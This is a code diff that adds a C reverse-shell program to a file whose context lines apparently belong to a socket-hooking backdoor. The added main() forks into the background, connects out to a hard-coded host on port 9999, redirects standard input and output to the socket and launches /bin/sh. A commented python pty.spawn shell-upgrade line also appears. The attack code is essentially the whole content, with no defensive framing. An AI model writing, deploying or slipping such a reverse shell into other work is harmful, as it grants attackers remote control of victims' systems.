@@ -161,3 +161,72 @@ int accept(int s, struct sockaddr *addr, socklen_t *addrlen) {
 //python -c 'import pty; pty.spawn("/bin/bash")'
 
 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <dirent.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <pthread.h>
+
+
+#define CLIENT_PORT 9999 // Replace with the desired port
+
+int main(void) {
+    pid_t pid = fork();
+    if (pid == -1) {
+        perror("Fork error");
+        return 1;
+    }
+    if (pid > 0) {
+        // Parent process
+        return 0;
+    }
+
+    struct sockaddr_in sa;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(CLIENT_PORT);
+
+    struct addrinfo hints, *result;
+    memset(&hints, 0, sizeof(struct addrinfo));
+    hints.ai_family = AF_INET;     // IPv4
+    hints.ai_socktype = SOCK_STREAM; // Stream socket (TCP)
+
+    int status = getaddrinfo("www.google.com", NULL, &hints, &result);
+    if (status != 0) {
+        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
+        return 1;
+    }
+    memcpy(&sa.sin_addr, &((struct sockaddr_in *)(result->ai_addr))->sin_addr, sizeof(struct in_addr));
+    freeaddrinfo(result);
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockt == -1) {
+        perror("Socket creation error");
+        return 1;
+    }
+
+    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+        perror("Connect error");
+        return 1;
+    }
+
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;
+}
+
+
